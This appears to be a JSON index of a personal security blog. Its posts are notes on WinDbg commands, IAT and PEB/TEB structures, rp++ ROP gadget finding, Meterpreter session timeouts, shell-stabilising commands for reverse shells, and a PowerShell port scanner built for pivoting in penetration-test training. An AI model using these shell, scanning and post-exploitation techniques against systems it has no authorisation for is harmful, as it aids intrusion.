The deferred for specific modules means no symbols are loaded and .reaload /f can be used to load the symbols.\nlm lm f We can also filter modules with the command below\nlm m kernel* We can learn more about the symbols using the x command, example\nx kernelbase!CreateProc* Windbg as a calculator # Mathematical evaluation is performed using the ? Command. The input is assumed to be in hex format.\n? 77269bc0 - 77231430 // substraction of memory address ? 77269bc0 \u0026gt;\u0026gt; 18 // shifting a address by 18 bytes Data Output Format # by default windbg display result in hexdecimal format. We can conver hex to decimal with 0n prefix or binary to hex with 0xy prefix\n? 0n41414141 // converts 41414141 from hex to decimal format ? 0y1110100110111 // convert binary value to hex and decimal The .formats allow us to convert to all representation at once\n.formats 41414141 // converts 41414141 to all formats Pseudo Registers # windbg has a series of pseudo registers, there are variables pre-defined.\nExample of pseudo registers are $teb contains address of TEB, $t0â€¦$t19 used for mathematical calculation\nWhen using pseudo registers or registers its recommend to prefix them @ character, example @$teb this tells windbg to treat the content as a register or pseudo registers. It speeds the evaluation process because windbg won\u0026rsquo;t try to resolve it as symbols first.\nr @$t0 = (41414141 - 414141) * 0n10 // store the result into pseudo register r @$t0 // display the result ? @$t0 \u0026gt;\u0026gt; 8 // right shift the result to 8 bits Check memory permission # We can check memory permission under Protect field.\n!vprot esp !vprot eip !vprot 00d13000 List stack frame # Using the k command to list the stack frame\nk k2 k3 k4 ","date":"19 March 2024","permalink":"/posts/postsec/windbg_usful_cmds/","section":"Posts","summary":"All windbg commands here # Link to windgb manual","title":"Windbg useful commands"},{"content":"This technique address the need to launch windbg with high privilege to debug processes running with system account privilege.\nYou can run windbg as normal user because we are running via cdb and cdb is running as system privilege.\nCreate a service for the process you want to debug,\nsc.exe create AppServiceDebug binpath= \u0026#34;C:\\Program Files\\Windows Kits\\10\\Debuggers\\x86\\cdb.exe -server tcp:port=50000 C:\\Program Files\\APP\\Debug\\app.exe\u0026#34; Go to windows services, you can run services.msc to open the windows services. Make sure process will run as System Account.\nAfter starting the service, you can open windbg and choose attach to remote process and enter the information below.\nWindbg Connect String Connection string\ntcp:port=50000 Tips # You have to quickly let windbg to continue with \u0026ldquo;g\u0026rdquo; for the service not to die. To start the service again after crash you need to kill the cdb.exe process and windbg.exe so you donâ€™t need to do it manually.\nExample of command\ntaskkill /F /IM cdb.exe \u0026amp;\u0026amp; taskkill /F /IM windbg.exe ","date":"10 March 2024","permalink":"/posts/postsec/windbg_cdb_attach/","section":"Posts","summary":"This technique address the need to launch windbg with high privilege to debug processes running with system account privilege.","title":"Windbg, the cdb.exe to attach to process  "},{"content":"You can find the Import Address Table of an application and the list of imported functions by attaching Windbg to the process and following the steps below.\nFind the module in windbg # lm Dump the header of the module # !dh \u0026lt;module_address\u0026gt; -f The result of !df look for Import Address Table Directory which will contain the offset vaule and the size.\nUse the IAT offset and size of IAT as follow to list the imported functions # dps \u0026lt;module_address\u0026gt;+\u0026lt;IAT_offset_address\u0026gt; \u0026lt;module_address\u0026gt;+\u0026lt;IAT_offset_address\u0026gt;+\u0026lt;sizeof_IAT\u0026gt; Reference: tom\u0026rsquo;s reversing viewing imports\n","date":"10 March 2024","permalink":"/posts/postsec/windbg_iat/","section":"Posts","summary":"You can find the Import Address Table of an application and the list of imported functions by attaching Windbg to the process and following the steps below.","title":"Find IAT using Windbg"},{"content":"","date":null,"permalink":"/tags/kali/","section":"Tags","summary":"","title":"Kali"},{"content":"","date":null,"permalink":"/tags/linux/","section":"Tags","summary":"","title":"Linux"},{"content":"My notes on some of useful tty commands # Color when listing files # export TERM=xterm-256-color alias ll=\u0026#39;ls -lsahta --color=auto\u0026#39; Run: ll Get interactive shell zsh shell // new kalli version working # python3 -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; CTRL + Z stty raw -echo; fg enter export TERM=xterm-256color export SHELL=bash export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp stty rows X columns Y // get rows and columns info: stty -a Get interactive shell fully working (old version kali, not using zsh). # ps -p $$ // check which if you are using bash, new version of kali uses zsh shells, it wont work. exec bash --login // if command above returned zsh, change to bash. After using one of the methods, run below for tty # crtz+z // on your keyboard run: stty raw -echo // kali , if you run under zsh run on one line: stty raw -echo; fg run: fg // kali hit enter // target export TERM=xterm // target export SHELL=bash export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp stty rows X columns Y // get rows and columns info: stty -a fix terminal exiting from the shell # reset tty that work most of the time # /usr/bin/script -qc /bin/bash /dev/null /usr/bin/script -qc /bin/sh /dev/null Python2 tty # The sh shell version\npython -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/sh\u0026#34;)\u0026#39; The bash shell version\npython -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; python3 tty # python3 -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; ","date":"10 March 2024","permalink":"/posts/postsec/tty_shell/","section":"Posts","summary":"My notes on some of useful tty commands # Color when listing files # export TERM=xterm-256-color alias ll=\u0026#39;ls -lsahta --color=auto\u0026#39; Run: ll Get interactive shell zsh shell // new kalli version working # python3 -c \u0026#39;import pty; pty.","title":"TTY shells"},{"content":"Narly is a plugin that parses the image and identifies the binary protections mechanisms enabled such as DEP, ASLR, SafeSEH and GS.\nVery useful during exploit development.\nCan be downloaded here narly\nHow to use # Note.: after narly is compiled copy the narly.dll in windbg winext directory.\nExample:\nC:\\Program Files\\Debugging Tools for Windows (x86)\\winext Loading the plugin:\n.load narly Running narly in windbg:\n!nmod ","date":"9 March 2024","permalink":"/posts/postsec/narly_windbg/","section":"Posts","summary":"Narly is a plugin that parses the image and identifies the binary protections mechanisms enabled such as DEP, ASLR, SafeSEH and GS.","title":"Narly plugin for windbg"},{"content":"The Import Address Table stores information about the loaded modules imported by the current running processs.\nThe IAT is important during reverse engineering process to identify functions been used by the application and therefore understand better the application functionality and capabilities, its possible to understand the application behaviour by reviewing the IAT and looking for functions commonly used by malware.\nExploit developer perspective the IAT is important to identiy weak/vulnerable functions used by the application, after idenfiying the vulnerable function the exploit developer will attempt to reach the vulnerable function by manipulating the network packet or file format.\nBelow is an example of dependecy walker loaded with notepad.exe. We can see functions and modules used by notepad.exe We can see the notepad.exe uses kernel32 module and kernelbase as well and multiple functions from these modules.\nDependecy Walker Thank you for reading.\n","date":"9 March 2024","permalink":"/posts/postsec/iat_win/","section":"Posts","summary":"The Import Address Table stores information about the loaded modules imported by the current running processs.","title":"The IAT (Import Address Table)"},{"content":"The rp++ is a ROP Gadget finder used by Exploit Developers to bypass DEP protection.\nOficial link rp++\nYou will need to compile.\nHow to use # Note.: -r means how many assembly instructions, -f the path to the .dll or .exe to extract the gadgets and \u0026gt; to re-direct the results to a file. You can also exclude bad chars with bad chars.\nrp++.exe -r 5 -f \u0026lt;some.dll\u0026gt; \u0026gt; rop_some.dll with new version you can exclude bad characters\nrp++.exe --bad-bytes \u0026#39;\\x00\\x0a\u0026#39; -r 5 -f \u0026lt;some.dll\u0026gt; \u0026gt; rop_some.dll ","date":"9 March 2024","permalink":"/posts/postsec/rp_gadget/","section":"Posts","summary":"The rp++ is a ROP Gadget finder used by Exploit Developers to bypass DEP protection.","title":"The RP++ ROP Finder"},{"content":"The TEB (Thread Environment Block) # Just as PEB contains information about the processs, the TEB has information about the thread running in the processs. A process when created contains at least one thread that execute the desired code, a process can create N Threads.\nEach thread has its own TEB structure, the TEB is often used by exploit developers and malware developers to locate the Pointer to the PEB structure or information about running thread.\nThe TEB is accessed through FS segment register on 32-bit and GS on 64-bit Windows.\ntypedef struct _TEB { PVOID Reserved1[12]; PPEB ProcessEnvironmentBlock; PVOID Reserved2[399]; BYTE Reserved3[1952]; PVOID TlsSlots[64]; BYTE Reserved4[8]; PVOID Reserved5[26]; PVOID ReservedForOle; PVOID Reserved6[4]; PVOID TlsExpansionSlots; } TEB, *PTEB; References: TEB Microsoft TEB Wikipedia\n","date":"9 March 2024","permalink":"/posts/postsec/teb_struct/","section":"Posts","summary":"The TEB (Thread Environment Block) # Just as PEB contains information about the processs, the TEB has information about the thread running in the processs.","title":"The TEB Structure"},{"content":"The PEB (Process Environment Block) # The PEB is a data structure that store information about the running process and can be accessed through intel x86 [FS] register at offset 0x30h.\nThe structure contains useful information such as loaded modules on the running process commonly used during shellcode devolpment to resolve Win32 APIs functions.\nAnother useful information in the PEB structure is BeingDebugged that shows if the running process is been attached to the debugger or not.\nThis feature is often used by malware developers as an anti-debugging technique to increase the difficult of defenders such as Malware Analysts to analyse the malware dynamically using a debugger.\nIf the malware detects that is been debugged the malware could act as completed different to hide true purpose from analysts or delete itself on disk.\nThe Ldr data structure is also important which I will explain later on.\ntypedef struct _PEB { BYTE Reserved1[2]; BYTE BeingDebugged; BYTE Reserved2[1]; PVOID Reserved3[2]; PPEB_LDR_DATA Ldr; PRTL_USER_PROCESS_PARAMETERS ProcessParameters; PVOID Reserved4[3]; PVOID AtlThunkSListPtr; PVOID Reserved5; ULONG Reserved6; PVOID Reserved7; ULONG Reserved8; ULONG AtlThunkSListPtr32; PVOID Reserved9[45]; BYTE Reserved10[96]; PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine; BYTE Reserved11[128]; PVOID Reserved12[1]; ULONG SessionId; } PEB, *PPEB; Reference: Microsoft API PEB Reference\n","date":"9 March 2024","permalink":"/posts/postsec/peb/","section":"Posts","summary":"The PEB (Process Environment Block) # The PEB is a data structure that store information about the running process and can be accessed through intel x86 [FS] register at offset 0x30h.","title":"The PEB Structure"},{"content":"","date":null,"permalink":"/tags/metasploit/","section":"Tags","summary":"","title":"MetaSploit"},{"content":"","date":null,"permalink":"/tags/meterpreter/","section":"Tags","summary":"","title":"Meterpreter"},{"content":"A year ago while testing a https reverse meterpreter shell after a 15 or 30 minutes the meterpreter session would die. After investigating I ensured my reverse payload was not been dectected by the anti-virus, but the issue persisted\nI tried the TCP Meterpreter Shell and that resolved the issue, could be the related to network conditions affecting the HTTPS connection as a result the payload wasn\u0026rsquo;t a good fit for that environment\nLeason learned if a specific payload doesn\u0026rsquo;t work, try a different one\nBut this issue lead me to further investigate and see what could be on my control to improve the connection and I found I could set the following parameters for the meterpreter sessions\nComm Timeout (Communication timeout) Retry Total Time Retry Wait Time You will have to experiment with the values until you reach the one that best suitable for the network environment I recommend to use Only if you already have attempted to change payloads and you still have issues\nThe command # set_timeouts -x 0 -c 100000 -w 2500 -t 100000 Flag and meaning # The -x stands for Expiration Timeout The -c stands for Communication Timeout The -w stands for Retry Wait Time the -t stands for Retry Total Time To view the results of newly configured settings run the following command # get_timeouts Reference: Metasploit Timeout control\n","date":"2 March 2024","permalink":"/posts/postsec/meterpreter_shell_timeout/","section":"Posts","summary":"A year ago while testing a https reverse meterpreter shell after a 15 or 30 minutes the meterpreter session would die.","title":"Meterpreter Session Time out"},{"content":"","date":null,"permalink":"/tags/powershell/","section":"Tags","summary":"","title":"Powershell"},{"content":"While training Red Teaming or Penetration Test hacking on plataforms like Hack the Box or previous offensive security training like OSCP or OSEP\nOne thing I noticed is during lateral movement through pivoting between the machines if I had to perform port scan enumeration on hosts located on different subnet/network utilizing proxychain+nmap or chisel+nmap, that was very painful and a nightmare\nNmap + Proxychains or Nmap + chisel did not work very well for me and for that reason i came up with something different and that was to leverage what native powershell has to offer, but for the offensive security side of it\nIf you have to scan large amount of ports even twerking the settings in nmap and proxychains will not give much gains compared to powershell. Below is a small snipped of powershell code that I developed and used multiple times during my training days that helped me and saved me a lot of time\nMy personal opnion on powershell is an awesome tool and one should master and be used as Read Teamer or Penetration Tester\nPowershell Port Scan Code # I used Runspace feature in powershell that allows to run multiple commands by creating new threads on existing process. The CreateRunSpacePool values 1,100 means mininum and maximum number of threads allowed to run at the same time. The AddScript is where you add the desired code to run\n$RunspacePool = [runspacefactory]::CreateRunspacePool(1,100) $RunspacePool.Open() $PowerShell = [powershell]::Create() $PowerShell.RunspacePool = $RunspacePool $PowerShell.AddScript({1..65535 | ForEach-Object { if((New-Object System.Net.Sockets.TcpClient).ConnectAsync(\u0026#34;YOUR_IP_HERE\u0026#34;,$_).wait(100)){write-host \u0026#34;Port $_ is opened\u0026#34;}}}) $Jobs = $PowerShell.BeginInvoke() If you want to go beyond you can improve the code snippet to run on multiple ips or creating a script that accept IP as an argument\n","date":"2 March 2024","permalink":"/posts/postsec/powershellscan/","section":"Posts","summary":"While training Red Teaming or Penetration Test hacking on plataforms like Hack the Box or previous offensive security training like OSCP or OSEP","title":"Powershell Port Scan"},{"content":"","date":null,"permalink":"/tags/programming/","section":"Tags","summary":"","title":"Programming"},{"content":"Welcome to my personal blog, where I document useful knowledge for me and maybe useful for others, personal research, share insights, and contribute with knowledge.\nYou can reach out to me on if you have any questions.\n","date":"1 March 2024","permalink":"/about/","section":"","summary":"Welcome to my personal blog, where I document useful knowledge for me and maybe useful for others, personal research, share insights, and contribute with knowledge.","title":"About"}]